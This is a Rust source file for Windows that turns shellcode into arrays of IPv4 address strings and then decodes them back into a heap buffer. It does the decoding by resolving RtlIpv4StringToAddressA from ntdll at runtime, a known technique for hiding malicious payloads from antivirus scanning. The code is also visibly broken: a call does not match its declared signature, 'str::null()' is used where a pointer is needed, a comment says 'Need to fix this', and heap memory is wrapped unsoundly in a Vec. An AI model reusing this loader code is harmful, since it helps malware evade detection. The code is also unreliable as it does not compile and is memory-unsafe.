use std::{
    ptr::*,
    fmt::Write,
    ffi::CString,
};
use windows_core::s;
use windows::Win32::System::{
    Memory::{HeapAlloc, HeapFree, GetProcessHeap, HEAP_FLAGS},
    LibraryLoader::{GetModuleHandleA, GetProcAddress},
};



// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer

/*
IPv4 Obfuscation
*/
pub fn generate_ipv4_output(shellcode: &[u8]) -> bool {
    if shellcode.is_empty() || shellcode.len() % 4 != 0 {
        return false;
    }

    let array_size = shellcode.len() / 4; // number of IP addresses (IP addr = 4 bytes (u8 * 4))

    print!("let ipv4_array = [\n\t"); // same as format! but printed to console

    let mut output = String::new();
    let mut counter = 0;

    // enumerate all of the ipv4 octets
    for (i, chunk) in shellcode.chunks(4).enumerate() {
        counter += 1;
        // each chunk is the 1 byte ipv4 octet
        let ip: String = format!("{}.{}.{}.{}", chunk[0], chunk[1], chunk[2], chunk[3]);

        if i == array_size - 1 {
            // last element
            write!(output, "\"{}\"", ip).unwrap();
        } else {
            // non-last elements (see the comma)
            write!(output, "\"{}\", ", ip).unwrap();
        }

        // add newline and tab every 8 elements for formatting
        if counter % 8 == 0 && i != array_size - 1 {
            output.push_str("\n\t");
        }
    }
    println!("{} \n];\n", output);
    true
}

/*
IPv4 Deobfuscation
*/
type RtlIpv4StringToAddressA = unsafe extern "system" fn (
    *const i8,          //PCSTR S
    i32,                //BOOLEAN strict 
    *const i8,          //PCSTR* Terminator
    *mut *const i8,     //PVOID Addr
    *mut u8,            //NTSTATUS
) -> i32;

// ipv4_array : array of ipv4 addresses returned from generate_ipv4_output() of type string slice array containg string slice
// d_address & d_size will be used to store the deobfuscated payload and size
pub fn ipv4_deobfuscation(ipv4_array: &[&str], d_address: &mut Option<Vec<u8>>, d_size: &mut usize) -> bool {
    let num_elements: usize = ipv4_array.len(); // number of ipv4 addresses
    let buff_size= num_elements * 4; // number of bytes

    // Allocate memory for the payload on the heap
    let buffer: *mut std::ffi::c_void = unsafe {
        HeapAlloc(GetProcessHeap().unwrap(), HEAP_FLAGS(0), buff_size)
    };

    if buffer.is_null() {
        println!("[!] HeapAlloc Failed");
        return false;
    }

    let mut tmp_buffer = buffer as *mut u8;
    


    // Get RtlIpv4StringToAddressA from ntdll.dll 
    let ntdll_result = unsafe {
        GetModuleHandleA(s!("ntdll.dll")) // use s! macro to handle null termination and type conversion automatically
    };

    // use match statement to handle result
    let ntdll_handle = match ntdll_result {
        Ok(handle) => handle, // On success, extract the handle
        Err(_) => {
            println!("[!] GetModuleHandleA Failed");
            unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer)) };
            return false;
        }
    };


    // Retrieve the function address inside of ntdll.dll
    let rtl_ipv4_func = unsafe {
        GetProcAddress(ntdll_handle,s!("RtlIpv4StringToAddressA"))
    };

    let rtl_ipv4_addr = match rtl_ipv4_func {
        Some(address) => address, // On success, retrieve the address
        None => {                                       // On failure, handle the error
            println!("[!] GetProcAddress Failed");
            unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer))};
            return false;
        }
    };


    let rtl_ipv4: RtlIpv4StringToAddressA = unsafe { std::mem::transmute(rtl_ipv4_func) };

    // Process each IPv4 address
    for ip in ipv4_array {
        let ip_cstr = match CString::new(*ip) {
            Ok(cstr) => cstr,
            Err(_) => {
                println!("[!] Failed to convert IP to CString: {}", ip);
                unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer)) };
                return false;
            }
        };
        
        // TODO: Need to fix this
        let mut terminator: *const i8 = str::null();
        let status = unsafe {
            rtl_ipv4(
                ip_cstr.as_ptr(),
                0, // FALSE for Strict
                &mut terminator,
                tmp_buffer
            )
        };

        if status != 0 {
            println!("[!] RtlIpv4StringToAddressA Failed At [{}] With Error 0x{:08X}", ip, status);
            unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer)) };
            return false;
        }

        tmp_buffer = unsafe { tmp_buffer.offset(4) };
    }

    // Convert to Vec and set output parameters
    let result = unsafe { Vec::from_raw_parts(buffer as *mut u8, buff_size, buff_size) };
    *d_address = Some(result);
    *d_size = buff_size;

    true


}